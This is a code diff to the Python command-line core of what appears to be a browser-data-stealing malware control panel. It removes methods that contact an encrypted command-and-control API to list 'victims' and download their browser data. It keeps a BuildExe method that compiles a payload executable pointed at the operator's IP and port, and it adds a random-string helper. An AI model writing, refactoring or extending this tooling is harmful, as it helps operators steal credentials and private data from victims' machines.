@@ -1,17 +1,17 @@
 """CLI core class"""
-from models.CryptoCore import CryptoCore
-import requests
+from models.ApiCalls import CallsHandler
 import json
 import re
 from sys import platform
 import os
 import subprocess
+import random
+import string
 
 
-class Core(CryptoCore):
+class Core(CallsHandler):
     """Core class for CLI"""
     IsReady = False
-    ApiUrl = None
 
     def GetUserInput(self, PromptText: str, ErrorText: str, InputLength: int, ExpectedInput: list, AllLower: bool) -> str:
         """
@@ -46,21 +46,6 @@ class Core(CryptoCore):
 
         return InputData
 
-    def CryptoParam(self, params: dict) -> None:
-        """
-        Set or generate random cryptographic parameters.
-
-        args:
-            @params (dict): a dictionary that has 2 keys "key" and "IV" or None.
-
-        return:
-            None.
-        """
-        if params is None:
-            self.CryptographicParam(None, None)
-        else:
-            self.CryptographicParam(params["key"], params["IV"])
-
     def save(self, FileName: str) -> None:
         """
         Save Encryption Key and IV to a given file
@@ -70,12 +55,15 @@ class Core(CryptoCore):
             None
         """
         data = {}
+
         if self.ApiUrl is not None:
             IpPort = self.ApiUrl[7:].split(":")
             data["ip"] = IpPort[0]
             data["port"] = int(IpPort[1])
+
         data["key"] = self.EncryptionKey.decode("utf-8")
         data["IV"] = self.IV.decode("utf-8")
+
         file = open(FileName, 'w')
         json.dump(data, file, indent=4)
         file.close()
@@ -95,9 +83,8 @@ class Core(CryptoCore):
         self.EncryptionKey = data["key"].encode("utf-8")
         self.IV = data["IV"].encode("utf-8")
         try:
-            ip = data["ip"]
-            port = data["port"]
-            self.ApiUrl = f"http://{ip}:{port}"
+            self.ip = data["ip"]
+            self.port = data["port"]
         except KeyError:
             pass
 
@@ -132,86 +119,6 @@ class Core(CryptoCore):
         except ValueError:
             return False
 
-    def check(self):
-        """Check if the api is reachable and validate the cryptographic parameters."""
-        if self.ApiUrl is None:
-            print("[-] The api URL is missing, You should set it before checking the api.")
-            return
-        if self.CheckParam() is True:
-            TestMessage = self.EncryptBuffer("Are you ready?")
-            header = {"cc": TestMessage}
-            url = self.ApiUrl + "/check"
-            try:
-                response = requests.get(url=url, headers=header, timeout=5)
-
-                if response.status_code == 200:
-                    self.IsReady = True
-                    print("[+] All good.")
-                else:
-                    print("[-] Incorrect cryptographic parameters. You should verify that the used parameters are the same ones on the api.")
-            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
-                print("[-] The api is not responding, You should verify that the api URL is correct.")
-                self.IsReady = False
-        else:
-            print("[-] The cryptographic parameters are missing, You should set them or load a setting file before checking the api.")
-            self.IsReady = False
-
-    def GetVictims(self) -> dict:
-        if self.IsReady is True:
-            url = self.ApiUrl + "/GetAll"
-
-            try:
-                response = requests.get(url=url)
-                data = self.DecryptBuffer(response.text).decode("utf-8")
-                return json.loads(data)
-            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
-                print("[-] The api is down.")
-
-        return None
-
-    def GetVictimBrowsersData(self, VictimIP):
-        if self.IsReady is True:
-            url = self.ApiUrl + "/GetVictimData"
-            ip = self.EncryptBuffer(VictimIP)
-            header = {"TARGET": ip}
-
-            try:
-                response = requests.get(url=url, headers=header, stream=True)
-                data = ""
-                if response.status_code == 200:
-                    for chunk in response.iter_content(chunk_size=102400):
-                        if chunk:
-                            data += chunk.decode("utf-8")
-                    data = self.DecryptBuffer(data).decode("utf-8")
-                    return json.loads(data)
-                elif response.status_code == 204:
-                    print("[-] The victim does not exists.")
-            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
-                print("[-] The api is down.")
-
-        return None
-
-    def GetVictimData(self, VictimIP):
-        if self.IsReady is True:
-            url = self.ApiUrl + "/down"
-            ip = self.EncryptBuffer(VictimIP)
-            header = {"TARGET": ip}
-
-            try:
-                response = requests.get(url=url, headers=header, stream=True)
-                data = ""
-                if response.status_code == 200:
-                    for chunk in response.iter_content(chunk_size=102400):
-                        if chunk:
-                            data += chunk.decode("utf-8")
-                    return self.DecryptBuffer(data)
-                elif response.status_code == 204:
-                    print("[-] The victim does not exists.")
-            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
-                print("[-] The api is down.")
-
-        return None
-
     def BuildExe(self, ip, port):
         os.chdir("./payload")
         command = []
@@ -225,3 +132,7 @@ class Core(CryptoCore):
         subprocess.run(command)
 
         os.chdir("..")
+
+    def RandomString(self, length: int) -> str:
+        """Generate a random string of given length"""
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
